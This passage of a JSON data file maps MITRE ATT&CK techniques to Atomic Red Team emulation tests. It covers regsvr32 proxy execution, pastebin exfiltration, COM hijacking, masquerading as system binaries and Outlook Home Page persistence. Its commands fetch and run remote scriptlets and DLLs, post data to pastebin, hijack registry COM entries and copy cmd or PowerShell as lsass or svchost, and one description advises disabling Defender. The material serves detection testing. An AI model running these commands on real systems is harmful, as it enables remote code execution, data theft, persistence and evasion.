at specified location (#{filename})\n", "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n"}], "executor": {"command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll\n", "name": "command_prompt"}}, {"name": "Regsvr32 remote COM scriptlet execution", "auto_generated_guid": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "URL to hosted sct file", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct"}, "regsvr32path": {"description": "Default location of Regsvr32.exe", "type": "path", "default": "C:\\Windows\\system32"}, "regsvr32name": {"description": "Default name of Regsvr32.exe", "type": "string", "default": "regsvr32.exe"}}, "executor": {"command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n", "name": "command_prompt"}}, {"name": "Regsvr32 local DLL execution", "auto_generated_guid": "08ffca73-9a3d-471a-aeb0-68b4aa3ab37b", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_name": {"description": "Name of DLL to Execute, DLL Should export DllRegisterServer", "type": "path", "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"}, "regsvr32path": {"description": "Default location of Regsvr32.exe", "type": "path", "default": "C:\\Windows\\system32"}, "regsvr32name": {"description": "Default name of Regsvr32.exe", "type": "string", "default": "regsvr32.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n", "prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n"}], "executor": {"command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n", "name": "command_prompt"}}, {"name": "Regsvr32 Registering Non DLL", "auto_generated_guid": "1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421", "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n", "supported_platforms": ["windows"], "input_arguments": {"dll_file": {"description": "Path to renamed dll file to be registered", "type": "path", "default": "%temp%\\shell32.jpg"}, "regsvr32path": {"description": "Default location of Regsvr32.exe", "type": "path", "default": "C:\\Windows\\system32"}, "regsvr32name": {"description": "Default name of Regsvr32.exe", "type": "string", "default": "regsvr32.exe"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requires a renamed dll file\n", "prereq_command": "if exist #{dll_file} ( exit 0 ) else ( exit 1 )\n", "get_prereq_command": "copy \"C:\\Windows\\System32\\shell32.dll\" \"#{dll_file}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n", "cleanup_command": "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"}}, {"name": "Regsvr32 Silent DLL Install Call DllRegisterServer", "auto_generated_guid": "9d71c492-ea2e-4c08-af16-c6994cdf029f", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.", "supported_platforms": ["windows"], "input_arguments": {"dll_name": {"description": "Name of DLL to Install", "type": "string", "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"}, "regsvr32path": {"description": "Default location of Regsvr32.exe", "type": "string", "default": "C:\\Windows\\system32"}, "regsvr32name": {"description": "Default name of Regsvr32.exe", "type": "string", "default": "regsvr32.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})", "prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\""}], "executor": {"command": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n", "name": "command_prompt"}}]}, "T1567.003": {"name": "Exfiltration to Text Storage Sites", "technique_id": "attack-pattern--ba04e672-da86-4e69-aa15-0eca5db25f43", "external_id": "T1567.003", "data_components": ["Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96"], "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.", "atomic_tests": [{"name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)", "auto_generated_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3", "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n", "supported_platforms": ["windows"], "input_arguments": {"api_key": {"description": "Pastebin API key", "type": "string", "default": "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"}}, "executor": {"command": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n", "name": "powershell", "elevation_required": false}}]}, "T1546.015": {"name": "Component Object Model Hijacking", "technique_id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae", "external_id": "T1546.015", "data_components": ["Command Execution", "Module Load", "Process Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ", "atomic_tests": [{"name": "COM Hijacking - InprocServer32", "auto_generated_guid": "48117158-d7be-441b-bc6a-d9e36e47b52b", "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/", "supported_platforms": ["windows"], "input_arguments": {"clsid_threading": {"description": "Threading Model", "type": "string", "default": "Apartment"}, "dllpath": {"description": "Path to the DLL.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll"}, "clsid": {"description": "Class ID to hijack.", "type": "string", "default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"}, "clsid_description": {"description": "Description for CLSID", "type": "string", "default": "MSAA AccPropServices"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL For testing", "prereq_command": "if (Test-Path \"#{dllpath}\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll\" -OutFile \"#{dllpath}\"\n"}], "executor": {"command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dllpath}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'", "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore", "name": "powershell"}}, {"name": "Powershell Execute COM Object", "auto_generated_guid": "752191b1-7c71-445c-9dbe-21bb031b18eb", "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/", "supported_platforms": ["windows"], "executor": {"command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n", "cleanup_command": "Get-Process -Name \"*calc\" | Stop-Process\n", "name": "powershell"}}, {"name": "COM Hijacking with RunDLL32 (Local Server Switch)", "auto_generated_guid": "123520cc-e998-471b-a920-bd28e3feafa0", "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ", "supported_platforms": ["windows"], "input_arguments": {"clsid_threading": {"description": "Threading Model", "type": "string", "default": "Both"}, "dll_path": {"description": "Path to the DLL.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1546.015_calc.dll"}, "clsid": {"description": "Class ID to hijack.", "type": "string", "default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"}, "clsid_description": {"description": "Description for CLSID", "type": "string", "default": "MSAA AccPropServices"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL For testing", "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll\" -OutFile \"#{dll_path}\"\n"}], "executor": {"command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'", "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore", "name": "powershell"}}, {"name": "COM hijacking via TreatAs", "auto_generated_guid": "33eacead-f117-4863-8eb0-5c6304fbfaa9", "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f", "name": "powershell"}}]}, "T1036.003": {"name": "Rename System Utilities", "technique_id": "attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b", "external_id": "T1036.003", "data_components": ["Command Execution", "Process Metadata", "File Modification", "File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)", "atomic_tests": [{"name": "Masquerading as Windows LSASS process", "auto_generated_guid": "5ba5a3d1-cf3c-4499-968a-a93155d1f717", "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n", "supported_platforms": ["windows"], "executor": {"command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "cleanup_command": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Masquerading as FreeBSD or Linux crond process.", "auto_generated_guid": "a315bfff-7a98-403b-b442-2ea1b255e556", "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n", "supported_platforms": ["linux"], "executor": {"command": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n", "cleanup_command": "rm /tmp/crond\n", "name": "sh"}}, {"name": "Masquerading - cscript.exe running as notepad.exe", "auto_generated_guid": "3a2a578b-0a01-46e4-92e3-62e2859b42f0", "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "cleanup_command": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Masquerading - wscript.exe running as svchost.exe", "auto_generated_guid": "24136435-c91a-4ede-9da1-8b284a1c1a23", "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Wscript file to execute must exist on disk\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n"}], "executor": {"command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n", "cleanup_command": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Masquerading - powershell.exe running as taskhostw.exe", "auto_generated_guid": "ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa", "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "cleanup_command": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Masquerading - non-windows exe running as windows exe", "auto_generated_guid": "bc15c13f-d121-4b1f-8c7d-28d95854d086", "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n", "supported_platforms": ["windows"], "input_arguments": {"outputfile": {"description": "path of file to execute", "type": "path", "default": "($env:TEMP + \"\\svchost.exe\")"}, "inputfile": {"description": "path of file to copy", "type": "path", "default": "PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n", "prereq_command": "if (Test-Path \"#{inputfile}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inputfile}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe\" -OutFile \"#{inputfile}\"\n"}], "executor": {"command": "copy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003\n", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Masquerading - windows exe running as different windows exe", "auto_generated_guid": "c3d24a39-2bfe-4c6a-b064-90cd73896cb0", "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n", "supported_platforms": ["windows"], "input_arguments": {"outputfile": {"description": "path of file to execute", "type": "path", "default": "($env:TEMP + \"\\svchost.exe\")"}, "inputfile": {"description": "path of file to copy", "type": "path", "default": "$env:ComSpec"}}, "executor": {"command": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Malicious process Masquerading as LSM.exe", "auto_generated_guid": "83810c46-f45e-4485-9ab6-8ed0e9e6ed7f", "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\n", "cleanup_command": "del C:\\T1036.003.txt >nul 2>&1\ndel C:\\lsm.exe >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "File Extension Masquerading", "auto_generated_guid": "c7fa0c3b-b57f-4cba-9118-863bf4e653fc", "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n", "supported_platforms": ["windows"], "input_arguments": {"exe_path": {"description": "path to exe to use when creating masquerading files", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}, "vbs_path": {"description": "path of vbs to use when creating masquerading files", "type": "path", "default": "PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.vbs"}, "ps1_path": {"description": "path of powershell script to use when creating masquerading files", "type": "path", "default": "PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.ps1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to copy must exist on disk at specified location (#{vbs_path})\n", "prereq_command": "if (Test-Path \"#{vbs_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{vbs_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs\" -OutFile \"#{vbs_path}\"\n"}, {"description": "File to copy must exist on disk at specified location (#{ps1_path})\n", "prereq_command": "if (Test-Path \"#{ps1_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{ps1_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.ps1\" -OutFile \"#{ps1_path}\"\n"}], "executor": {"command": "copy \"#{exe_path}\" %temp%\\T1036.003_masquerading.docx.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.003_masquerading.pdf.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.003_masquerading.ps1.exe /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.xls.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.xlsx.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.png.vbs /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.doc.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.pdf.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.rtf.ps1 /Y\n%temp%\\T1036.003_masquerading.docx.exe\n%temp%\\T1036.003_masquerading.pdf.exe\n%temp%\\T1036.003_masquerading.ps1.exe\n%temp%\\T1036.003_masquerading.xls.vbs\n%temp%\\T1036.003_masquerading.xlsx.vbs\n%temp%\\T1036.003_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1\n", "cleanup_command": "del /f %temp%\\T1036.003_masquerading.docx.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.pdf.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.ps1.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.xls.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.xlsx.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.png.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.doc.ps1 > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.pdf.ps1 > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.rtf.ps1 > nul 2>&1\n", "name": "command_prompt"}}]}, "T1137.004": {"name": "Outlook Home Page", "technique_id": "attack-pattern--bf147104-abf9-4221-95d1-e81585859441", "external_id": "T1137.004", "data_components": ["Command Execution", "Application Log Content", "Process Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)\n", "atomic_tests": [{"name": "Install Outlook Home Page Persistence", "auto_generated_guid": "7a91ad51-e6d2-4d43-9471-f26362f5738e", "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)", "type": "string", "default": "file://PathToAtomicsFolder\\T1137.004\\src\\T1137.004.html"}, "outlook_version": {"description": "Version of Outlook that is installed", "type": "float", "default": 16.0}, "outlook_folder": {"description": "Name of the Outlook folder to modify the homepage setting for", "type": "string", "default": "Inbox"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n", "cleanup_command": "reg.exe delete HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /f >nul 2>&1\n"}}]}, "T1567.002": {"name": "Exfiltration to Cloud Storage", "technique_id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b", "external_id": "T1567.002", "data_components": ["Command Execution", "Network Traffic Content", "Network Connection Creation", "Network Traffic Flow", "File Access"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": 